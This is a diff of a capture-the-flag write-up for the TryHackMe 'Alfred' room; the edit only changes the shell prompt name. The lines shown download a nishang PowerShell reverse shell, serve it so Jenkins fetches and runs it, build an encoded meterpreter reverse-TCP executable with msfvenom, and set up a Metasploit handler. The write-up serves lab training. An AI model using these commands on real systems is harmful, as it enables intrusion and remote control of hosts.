@@ -53,7 +53,7 @@ after some enumerating:
 now when we in Jenkins (what is [Jenkins](https://youtu.be/LFDrDnKPOTg)), the plan is create a new Project and use created project to execute a powershell to get our reverse shell. Now let get our revershell.ps from a OP github project call [nishang](https://github.com/samratashok/nishang)
 
 ```console
-kali@kali:~/THM/alfred$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+bibo318@parrot:~/THM/alfred$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 --2020-07-22 17:07:38--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.192.133, 151.101.128.133, ...
 Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.
@@ -64,7 +64,7 @@ Saving to: ‘Invoke-PowerShellTcp.ps1’
 Invoke-PowerShellTcp.ps1 100%[=================================>]   4.24K  --.-KB/s    in 0s      
 
 2020-07-22 17:07:38 (39.2 MB/s) - ‘Invoke-PowerShellTcp.ps1’ saved [4339/4339]
-kali@kali:~/THM/alfred$ python -m SimpleHTTPServer 8888 # set up the server
+bibo318@parrot:~/THM/alfred$ python -m SimpleHTTPServer 8888 # set up the server
 ```
 now we gonna get Jenkins to fetch our reverse shell from our server and execute it. Go to Jenkis dashboad and follow this step (read more [here](https://stackoverflow.com/questions/21276351/how-can-i-execute-shell-script-in-jenkinsfile)):
 1. Click on `New Item` (left panel)
@@ -79,8 +79,8 @@ visite alfred.thm:8080/job/kurohat/build or press `build now` to build our proje
 
 ## switching to msfconsole shell
 ```console
-kali@kali:~/THM/alfred$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<ip> LPORT=9696 -f exe -o shell.exe #create shell
-kali@kali:~/THM/alfred$ python -m SimpleHTTPServer 8888
+bibo318@parrot:~/THM/alfred$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<ip> LPORT=9696 -f exe -o shell.exe #create shell
+bibo318@parrot:~/THM/alfred$ python -m SimpleHTTPServer 8888
 ```
 
 use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.8.14.151 set LPORT 9696  run
